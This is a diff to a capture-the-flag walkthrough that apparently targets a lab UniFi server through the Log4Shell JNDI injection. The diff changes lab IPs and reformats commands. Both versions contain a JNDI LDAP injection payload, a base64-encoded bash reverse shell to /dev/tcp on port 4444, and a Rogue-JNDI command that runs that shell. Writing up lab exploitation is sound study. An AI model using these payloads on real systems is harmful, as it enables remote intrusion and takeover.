@@ -8,7 +8,7 @@
 ## Geting Started
 Use command to set Target IP
 ```bash
-IP=10.129.40.113 ; echo $IP
+IP=10.129.61.224 ; echo $IP
 ```
 
 Use command to set Target IP
@@ -183,12 +183,12 @@ Nmap done: 1 IP address (1 host up) scanned in 158.01 seconds
 ---
 ### WEBSITE ENUM
 ---
-Navigate to 10.129.40.113:8080 on firefox.
+Navigate to http://10.129.61.224:8080 on firefox.
 
 Redirected to 
 
 ```
-https://10.129.40.113:8443/manage/account/login?redirect=%2Fmanage
+https://10.129.61.224:8443/manage/account/login?redirect=%2Fmanage
 ```
 
 See Uniif login page
@@ -219,7 +219,7 @@ Login into site with test:test to capture POST
 We input the payload into the remember field as shown above so that we can identify an injection point if  one exists. If the request causes the server to connect back to us, then we have verified that the application is vulnerable.
 
 ```bash
-${jndi:ldap://10.10.15.168/whatever}
+"remember":"${jndi:ldap://10.10.15.149/whatever}",
 ```
 
 >**JNDI** is the acronym for the **Java Naming and Directory Interface API** . By making calls to this API,  applications locate resources and other program objects. A resource is a program object that provides  connections to systems, such as database servers and messaging systems.  
@@ -284,23 +284,28 @@ mvn package
 To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding  issues.
 
 ```bash
-echo 'bash -c bash -i >&/dev/tcp/10.10.15.168/4444 0>&1' | base64
+echo 'bash -c bash -i >&/dev/tcp/10.10.15.149/4444 0>&1' | base64
+
+echo 'bash -c bash -i >&/dev/tcp/10.10.15.149/4444 0>&1' |  
+base64
 ```
 
 ```bash
-YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTY4LzQ0NDQgMD4mMQo==
+YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTQ5LzQ0NDQgMD4mMQo=
 ```
 
 After the payload has been created, start the Rogue-JNDI application while passing in the payload as part of  the ``--command`` option and your ``tun0 IP`` address to the ``--hostname`` option
 
 ```bash
-java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTY4LzQ0NDQgMD4mMQo==}| {base64,-d}|{bash,-i}" --hostname "10.10.15.168"
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTQ5LzQ0NDQgMD4mMQo=}| {base64,-d}|{bash,-i}" --hostname "10.10.15.149"
 
-java -jar target/RogueJndi-1.1.jar --command "bash -c  
-{echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTY4LzQ0NDQgMD4mMQo==}|{base64,-  
-d}|{bash,-i}" --hostname "10.10.15.168"
 ```
----
+
+```bash
+"remember":"${jndi:ldap://10.10.15.149:1389/o=tomcat}",
+```
+
+
 
 ## Privilege Escalation
 ## Flags
